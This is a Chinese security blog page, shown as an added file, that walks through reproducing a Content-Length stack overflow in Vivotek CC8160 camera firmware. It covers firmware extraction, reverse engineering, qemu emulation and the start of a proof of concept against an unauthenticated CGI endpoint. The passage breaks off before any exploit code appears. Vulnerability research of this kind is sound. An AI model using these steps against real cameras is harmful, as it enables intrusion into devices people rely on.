@@ -1,0 +1,944 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    Vivotek 摄像头 HTTP 缓冲区溢出漏洞 | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="Vivotek CC8160 是一款网络摄像机，在 VVTK-0113b 版本之前的固件中存在一个缓冲区溢出漏洞。 可以在这里下载固件：CC8160-VVTK-0100d.flash.zip   下载之后解压拿到 CC8160-VVTK-0100d.flash.pkg 附件，然后利用 binwalk 提取固件： 1binwalk -Me CC8160-VVTK-0100d.flash.pkg  解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vivotek 摄像头 HTTP 缓冲区溢出漏洞">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/09/29/Vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%20HTTP%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="Vivotek CC8160 是一款网络摄像机，在 VVTK-0113b 版本之前的固件中存在一个缓冲区溢出漏洞。 可以在这里下载固件：CC8160-VVTK-0100d.flash.zip   下载之后解压拿到 CC8160-VVTK-0100d.flash.pkg 附件，然后利用 binwalk 提取固件： 1binwalk -Me CC8160-VVTK-0100d.flash.pkg  解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/001.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/003.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/004.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/006.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/007.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/008.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/009.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/010.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/011.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/012.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/013.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/014.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/015.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/016.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/017.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/018.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/019.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/020.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/021.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/022.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/023.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/024.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/025.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/026.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/027.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/028.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/029.png">
+<meta property="article:published_time" content="2026-09-29T07:45:00.000Z">
+<meta property="article:modified_time" content="2026-09-29T07:44:51.225Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="iot">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="qemu">
+<meta property="article:tag" content="vivotek">
+<meta property="article:tag" content="固件">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/001.png">
+    <link rel="canonical" href="https://idcm-svg.github.io/HFTTC.github.io/2026/09/29/Vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%20HTTP%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
+      <meta name="keywords" content="南阳理工学院, 网络安全, 软件安全, 计软, CTF, Pwn, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"Vivotek 摄像头 HTTP 缓冲区溢出漏洞 | HFTTC's Blog","headline":"Vivotek 摄像头 HTTP 缓冲区溢出漏洞","description":"心之所向，无问西东","url":"https://idcm-svg.github.io/HFTTC.github.io/2026/09/29/Vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%20HTTP%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","inLanguage":"zh-CN"}</script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">首页</span>
+          </a>
+          <div class="main-nav-dropdown-wrap">
+            <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog" aria-haspopup="true">
+                <div class="main-nav-icon icon rotate">
+                    &#xe62b;
+                </div>
+              <span class="main-nav-link">目录</span>
+            </a>
+            <div class="main-nav-dropdown-menu" role="menu">
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/catalog/" role="menuitem">基础知识</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/pwn/" role="menuitem">PWN知识集结</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/iot/" role="menuitem">IOT</a>
+                  <a class="main-nav-dropdown-link" href="/HFTTC.github.io/kernel/" role="menuitem">Kernel</a>
+                  <div class="main-nav-dropdown-item has-children">
+                    <a class="main-nav-dropdown-link main-nav-dropdown-parent" href="/HFTTC.github.io/writeups" role="menuitem" aria-haspopup="true">比赛wp</a>
+                    <div class="main-nav-submenu" role="menu">
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/" role="menuitem">网鼎杯 2024 半决赛</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%AE%81%E6%B3%A2%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn-2026/" role="menuitem">第九届宁波市网络安全&amp;西湖论剑</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/" role="menuitem">湾区杯</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/12/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202025-pwn/" role="menuitem">西湖论剑</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/10/%E9%BB%84%E9%B9%A4%E6%9D%AF2026-pwn/" role="menuitem">黄鹤杯</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/lexington-informatics-tournament-ctf-2026/" role="menuitem">Lexington Informatics Tournament CTF 2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/l3akctf2026/" role="menuitem">L3akCTF 2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/" role="menuitem">nepctf2026</a>
+                        <a class="main-nav-dropdown-link" href="/HFTTC.github.io/2026/06/19/SCTF2026%20slang/" role="menuitem">SCTF2026</a>
+                    </div>
+                  </div>
+            </div>
+          </div>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/notice">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">公告</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">友链</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">归档</span>
+          </a>
+          <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+              <div class="main-nav-icon icon rotate">
+                  &#xe62b;
+              </div>
+            <span class="main-nav-link">关于</span>
+          </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/HFTTC.github.io/images/iot/covers/vivotek-cc8160-content-length.jpg" alt="Vivotek 摄像头 HTTP 缓冲区溢出漏洞">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">Vivotek 摄像头 HTTP 缓冲区溢出漏洞</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99-POC-%E6%B5%8B%E5%81%8F%E7%A7%BB%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">编写 POC 测偏移：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E8%AF%A5%E7%BC%96%E5%86%99-exp-%E4%BA%86"><span class="toc-number">4.</span> <span class="toc-text">接下来就该编写 exp 了</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-libc-base%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">寻找 libc_base：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">151</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Vivotek 摄像头 HTTP 缓冲区溢出漏洞" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-09-29T07:45:00.000Z" itemprop="datePublished">2026-09-29</time>
+    <time style="display: none;" id="post-update-time">2026-09-29</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-09-29T07:44:51.225Z" itemprop="dateModified">2026-09-29</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>Vivotek CC8160 是一款网络摄像机，在 VVTK-0113b 版本之前的固件中存在一个缓冲区溢出漏洞。</p>
+<p>可以在这里下载固件：<a target="_blank" rel="noopener" href="https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip">CC8160-VVTK-0100d.flash.zip</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/001.png"></p>
+<p>下载之后解压拿到 <code>CC8160-VVTK-0100d.flash.pkg</code> 附件，然后利用 binwalk 提取固件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me CC8160-VVTK-0100d.flash.pkg</span><br></pre></td></tr></table></figure>
+
+<p>解压后有四个<code>.extracted</code>看一看内容：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/002.png"></p>
+<p>进入找到 squashfs-root：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/003.png"></p>
+<p>可以现在启动脚本中查找相关信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./etc/init.d/rcS</span><br></pre></td></tr></table></figure>
+
+<p><code>/etc/init.d/rcS</code> 是 Linux 根文件系统中的核心初始化脚本。它不是附件，而是摄像头固件解包后，Linux 系统启动时首先执行的关键脚本之一。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/004.png"></p>
+<p><code>/etc/rcS</code>：这通常是一个很简单的包装脚本，或者在某些系统里根本不存在。如果存在，它的作用往往只是转去执行<code>/etc/init.d/rcS</code>，或者用于处理 BusyBox 特有的启动逻辑，相当于<code>/etc/init.d/rcS</code>的软链接。因此可以直接在 &#x2F;etc&#x2F;init.d 中寻找有关 HTTP 服务的可执行文件即可：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/005.png"></p>
+<p>在&#x2F;etc&#x2F;init.d 中找到了 httpd 文件，发现启动了&#x2F;usr&#x2F;sbin&#x2F;httpd，那这个就是我们需要分析的二进制文件：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/006.png"></p>
+<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>打开 httpd 直接就识别到了 ARM 结构：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/007.png"></p>
+<p>已知该漏洞存在于 “Content-Length”，那就通过搜索字符串去定位漏洞函数：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/008.png"></p>
+<p>直接看 Content-Length 这一部分：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/009.png"></p>
+<p>这一部分逻辑很简单：<code>v34 - (v35 + 1)</code>就是<code>Content-Length</code>的值的长度，把这个<code>Content-Length</code>的内容直接复制到栈上，可以看到这里假设修改 Content-Length 就会造成栈溢出：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/010.png"></p>
+<h4 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>我们可以利用 qemu-user 去模拟固件环境：先把 qemu-arm-static 复制到 squashfs-root 目录下，然后通过 chroot 去切换根目录，利用 qemu-arm-static 去模拟 &#x2F;usr&#x2F;sbin&#x2F;httpd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-arm-static ./</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/011.png"></p>
+<p>这里报错 cat’t open &#x2F;dev&#x2F;null，依旧在 IDA 寻找字符串看一看：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/012.png"></p>
+<p>也就是说缺失了这个文件，我们创建一个空文件就好了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> ./dev/null         <span class="comment"># 直接用nano或者vim也可以</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/013.png"></p>
+<p>重新运行，然后就产生新的报错了：Could not open boa.conf for reading. </p>
+<p>查询 IDA：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/014.png"></p>
+<p>那么实际上意思是说缺少了<code>./etc/conf.d/boa/boa.conf</code>这个附件</p>
+<p>通过<code>find . -name &quot;boa.conf&quot;</code>可以快速寻找到该文件的位置，结果没有找到。最后在<code>_31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/</code>里面找到了 <code>conf.d/boa/boa.conf</code>。</p>
+<p>把他复制到<code>./etc/conf.d/boa/boa.conf</code>即可。</p>
+<p>之后如果依旧遇到缺少类似的文件，都可以利用自行创建或者查看其他的解压包中是否存在该文件来解决。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/015.png"></p>
+<p>再次运行，发现存在新的问题：这次不再是缺少文件，我们通过 IDA 查看报错的原因：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/016.png"></p>
+<p><code>gethostname</code> 函数可以通过主机名称获取本机的 IP 地址，那么猜测这里是 IP 获取失败导致的</p>
+<p>查询<code>./etc/hosts</code>，再通过 hostname 命令去查询本地的主机名，发现两者也不一致</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/017.png"></p>
+<p>那么这里直接把 Network-Camera localhost 改成本地主机名即可：再次运行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/018.png"></p>
+<p>该漏洞调用的端口是 :80，但是本机显示 windows 端已经被占用了，那就不去和 windows 端争用一个，把摄像头调用端口修改为 8000 即可：重新运行</p>
+<!-- 这是一张图片，ocr 内容为：SUDO CHROOT /GEMU-ARM-STATIC /USR/SBIN/HTTPD SENDTO() ERROR 20 SERVER PUSH URI 3 VIDEO3.MJPG [DEBUG]ADD [DEBUG JADD SERVER URI 4 VIDEO4.MJPG PUSHU AFTER INI, SERVER_PUSH_URI[O] IS /VIDEO3.MJPG DEBUG [DEBUG] AFTER INI, SERVER_PUSH_URI[1] I [1] IS /VIDEO4.MJPG FOPEN PID FILE:NOT A DIRECTORY [25/SEP/2026:05:28:03 +0000] BOA: SERVER VERSION 1.32.10(BOA/0.94.14RC21) [25/SEP/2026:05:28:03 +000] BOA: STARTING SERVER PID-11620,PORT 8000 -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/019.png"></p>
+<p>确实可以从网页中打开：</p>
+<!-- 这是一张图片，ocr 内容为：公 串 127.0.0.8080 聊天 CLIENT_SETTINGS| CONFIGURATION |. N|_LANGUAGE -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/020.png"></p>
+<h4 id="编写-POC-测偏移："><a href="#编写-POC-测偏移：" class="headerlink" title="编写 POC 测偏移："></a>编写 POC 测偏移：</h4><p>由于该漏洞是 Content-Length 字段处产生的溢出，因此只需要找到一个未授权的端口，在发送 HTTP 报文的时候把 Content-Length 字段改成非法的字符串就可以触发这个漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chroot</span> ./ ./qemu-arm-static ./usr/sbin/httpd -d</span><br></pre></td></tr></table></figure>
+
+<p>-d 看一看，d 就是不 daemonize，fd 2 留在你的终端上，所有解析日志实时刷出来。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/021.png"></p>
+<p>我们随便选择一个 GET 请求，伪造一下把 Content-Length 字段改成非法的字符串</p>
+<p><code>GET /cgi-bin/viewer/getparam.cgi</code></p>
